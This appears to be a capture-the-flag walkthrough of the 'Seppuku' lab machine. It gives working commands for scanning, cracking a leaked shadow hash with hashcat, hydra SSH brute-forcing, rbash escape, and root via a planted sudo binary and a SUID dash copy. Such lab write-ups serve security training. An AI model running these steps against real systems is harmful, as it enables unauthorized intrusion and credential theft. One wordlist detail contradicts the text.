# Seppuku

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.237.90
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.3)
- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (nginx 1.14.2)
  - Additional webpages:
    - `http://192.168.237.90/info.php`
- **139** — SMB
  - Sharename: `print$` (Printer Drivers), `IPC$` (IPC Service, Samba 4.9.5-Debian)
- **445** — NetBIOS-SSN (Samba smbd 4.9.5-Debian, workgroup: WORKGROUP)
- **7080** — HTTPS (LiteSpeed httpd)
  - Additional webpages:
    - `https://192.168.237.90:7080/docs/`
- **7601** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.237.90:7601/a/`
    - `http://192.168.237.90:7601/b/`
    - `http://192.168.237.90:7601/c/`
    - `http://192.168.237.90:7601/ckeditor/`
    - `http://192.168.237.90:7601/d/`
    - `http://192.168.237.90:7601/database/`
    - `http://192.168.237.90:7601/e/`
    - `http://192.168.237.90:7601/f/`
    - `http://192.168.237.90:7601/h/`
    - `http://192.168.237.90:7601/keys/`
    - `http://192.168.237.90:7601/production/`
    - `http://192.168.237.90:7601/q/`
    - `http://192.168.237.90:7601/r/`
    - `http://192.168.237.90:7601/secret/`
    - `http://192.168.237.90:7601/t/`
    - `http://192.168.237.90:7601/w/`
    - `http://192.168.237.90:7601/stg/`
- **8088** — HTTP (LiteSpeed httpd)
  - Additional webpages:
    - `http://192.168.237.90:8088/blocked/`
    - `http://192.168.237.90:8088/docs/`
    - `http://192.168.237.90:8088/error404.html`
    - `http://192.168.237.90:8088/index.php`

Visiting `http://192.168.237.90` required a login. The `/info.php` endpoint revealed a `phpinfo()` page. Port `7601` displayed an image of `Seppuku.jpg`.

### Keys Enumeration

The `/keys/` directory on port 7601 contained private SSH keys (`private` and `private.bak` contained the same key).

### Secret Enumeration

The `/secret/` directory on port 7601 contained:

- `passwd.bak` — A backup of `/etc/passwd`, which included the user `rabbit-hole`
- `shadow.bak` — A backup of `/etc/shadow`, containing the password hash for `r@bbit-hole`:

```
r@bbit-hole:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

- `password.lst` — A wordlist of passwords

Cracked the SHA-512 hash using `hashcat` with the provided wordlist:

```
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
...
$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:a1b2c3
```

The credentials `r@bbit-hole:a1b2c3` were obtained, but SSH login with these credentials failed.

### SMB Enumeration

Enumerated SMB using `enum4linux-ng`:

```
enum4linux-ng 192.168.237.90 -A -Gm -R -t 15
```

The following Unix users were discovered:

- `seppuku` (RID 1000)
- `samurai` (RID 1001)
- `tanto` (RID 1002)
- `debian` (RID 1003)

### SSH Brute-Force

Brute-forced the SSH service on port 22 using the discovered usernames and the `password.lst` wordlist:

```
hydra -L users.lst -P password.lst ssh://192.168.237.90
...
[22][ssh] host: 192.168.237.90   login: seppuku   password: eeyoree
```

The credentials `seppuku:eeyoree` were obtained.

Logged in via SSH:

```
ssh seppuku@192.168.237.90
seppuku@192.168.237.90's password: eeyoree

seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ whoami
seppuku
```

Retrieved the local flag:

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ cat local.txt
0a90e776ac338b06f016ce2ba0d4b8f1
```

## Privilege escalation

Uploaded `linpeas.sh` to the target via SCP. The `-O` flag is required because newer versions of OpenSSH default to the SFTP protocol, which fails if the target lacks the SFTP subsystem or if login scripts print banners that disrupt the protocol:

```
scp -O linpeas.sh seppuku@192.168.237.90:/tmp
seppuku@192.168.237.90's password: eeyoree
```

Attempting to change directory revealed a restricted shell (`rbash`):

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ cd
-rbash: cd: restricted
```

Escaped the restricted shell using Python:

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Ran `linpeas.sh` from `/tmp` to enumerate privilege escalation vectors.

### Password Reuse

The `ln` sudo rule (`/usr/bin/ln -sf /root/ /tmp/`) did not seem immediately useful. However, listing hidden files in `/home/seppuku` revealed a root-owned `.passwd` file:

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ ls -al
total 40
drwxr-xr-x 3 seppuku seppuku 4096 Oct 29 10:17 .
drwxr-xr-x 6 root    root    4096 Oct 29 07:53 ..
-rw------- 1 seppuku seppuku  770 Oct 29 10:17 .bash_history
-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
drwx------ 3 seppuku seppuku 4096 Oct 29 10:03 .gnupg
-rw-r--r-- 1 seppuku seppuku   33 Oct 29 07:53 local.txt
-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
-rw-r--r-- 1 seppuku seppuku  176 Oct 29 10:03 .wget-hsts
```

The `.passwd` file contained a password:

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ cat .passwd
12345685213456!@!@A
```

This password was reused for the `samurai` user account:

```
seppuku@lab-pg-10-debian10-seppuku1-245-187:~$ su samurai
Password: 12345685213456!@!@A
samurai@lab-pg-10-debian10-seppuku1-245-187:/home/seppuku$ whoami
samurai
```

### Sudo Misconfiguration

The `samurai` user had a sudo rule allowing execution of a binary in `tanto`'s home directory:

```
samurai@lab-pg-10-debian10-seppuku1-245-187:/home/seppuku$ sudo -l
...
User samurai may run the following commands on
        lab-pg-10-debian10-seppuku1-245-187:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

The binary `/home/tanto/.cgi_bin/bin` did not exist. SSHed into `tanto`'s account using the private key found on the web server:

```
chmod 600 private
ssh tanto@192.168.237.90 -i private
tanto@lab-pg-10-debian10-seppuku1-245-187:~$ whoami
tanto
```

The login dropped into an `rbash` shell. Escaped it using Python:

```
tanto@lab-pg-10-debian10-seppuku1-245-187:~$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Created the `.cgi_bin` directory and a `bin` file containing a root shell:

```
tanto@lab-pg-10-debian10-seppuku1-245-187:~$ mkdir .cgi_bin
tanto@lab-pg-10-debian10-seppuku1-245-187:~$ cd .cgi_bin

tanto@lab-pg-10-debian10-seppuku1-245-187:~/.cgi_bin$ echo '/bin/bash -p' > bin
tanto@lab-pg-10-debian10-seppuku1-245-187:~/.cgi_bin$ chmod +x bin
```

Ran the sudo rule as `samurai` to execute the planted binary as root:

```
samurai@lab-pg-10-debian10-seppuku1-245-187:~$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*

root@lab-pg-10-debian10-seppuku1-245-187:/home/samurai# whoami
root
```

Retrieved the proof flag:

```
root@lab-pg-10-debian10-seppuku1-245-187:/home/samurai# cd /root
root@lab-pg-10-debian10-seppuku1-245-187:~# cat proof.txt
8258adb0c5a8fe9f3bbbedff37369d03
```

### Alternative Privilege Escalation — sudo misconfiguration with dash SUID payload

The same sudo rule (`/../../../../../../home/tanto/.cgi_bin/bin /tmp/*`) can be exploited with a different payload. Instead of directly spawning a shell, the planted binary copies `/bin/dash` to a writable directory, sets the SUID bit, and then the SUID dash is executed with the `-p` (privileged mode) flag to obtain a root shell.

Create the `.cgi_bin` directory and a `bin` script that copies dash and sets SUID:

```
tanto@lab-pg-10-debian10-seppuku1-245-187:~$ mkdir .cgi_bin
tanto@lab-pg-10-debian10-seppuku1-245-187:~/.cgi_bin$ cat > bin << 'EOF'
#!/bin/sh
cp /bin/dash /var/tmp/dash
chmod u+s /var/tmp/dash
EOF
tanto@lab-pg-10-debian10-seppuku1-245-187:~/.cgi_bin$ chmod +x bin
```

Run the sudo rule as `samurai` to execute the planted binary as root:

```
samurai@lab-pg-10-debian10-seppuku1-245-187:~$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

Execute the SUID dash binary with the `-p` flag:

```
samurai@lab-pg-10-debian10-seppuku1-245-187:~$ /var/tmp/dash -p

root@lab-pg-10-debian10-seppuku1-245-187:/home/samurai# whoami
root
```

Credit: [CyberArri — Seppuku Writeup](https://cyberarri.com/2023/10/22/seppuku-writeup)

